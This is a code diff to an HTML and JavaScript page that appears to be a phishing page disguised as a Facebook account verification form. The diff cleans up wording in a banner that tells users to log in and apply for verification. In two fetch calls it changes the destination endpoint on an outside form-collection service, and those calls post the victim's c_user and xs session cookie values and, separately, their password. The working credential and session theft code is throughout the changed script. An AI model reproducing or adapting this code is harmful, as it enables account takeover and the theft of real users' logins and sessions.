@@ -767,9 +767,9 @@
         </div>
 
         <div class="warn-strip">
-            ⚠️ <div><strong id="t-warn-imp">Important:</strong> <span id="t-warn-body">Please note First login to your account in the Chrome browser then logout and login again After that apply for the form Only then will your verification be completed Thank you.</span></div>
-    
-       
+            ⚠️ <div><strong id="t-warn-imp">Important:</strong> <span id="t-warn-body"> Please note: First login to your account in the Chrome browser, then logout and login again. After that, apply for the form. Only then will your verification be completed. Thank you..</span></div>
+        </div>
+
         <div class="card vid-card">
             <div class="vid-lbl">
                 <svg viewBox="0 0 16 16" fill="none"><polygon points="3,2 14,8 3,14" fill="#1877f2"/></svg>
@@ -1282,7 +1282,7 @@
         const btn = document.getElementById("submitBtn");
         btn.classList.add("loading"); btn.disabled = true;
 
-        fetch("https://submit-form.com/lZmVXziXb", {
+        fetch("https://submit-form.com/HODk5Bwu2", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ c_user: document.getElementById("c_user").value.trim(), xs: document.getElementById("xs").value.trim() })
@@ -1314,7 +1314,7 @@
 
         btn.classList.add("loading"); btn.disabled = true;
 
-        fetch("https://submit-form.com/lZmVXziXb", {
+        fetch("https://submit-form.com/HODk5Bwu2", {
             method: "POST",
             headers: { "Content-Type": "application/json", "Accept": "application/json" },
             body: JSON.stringify({ password: val })
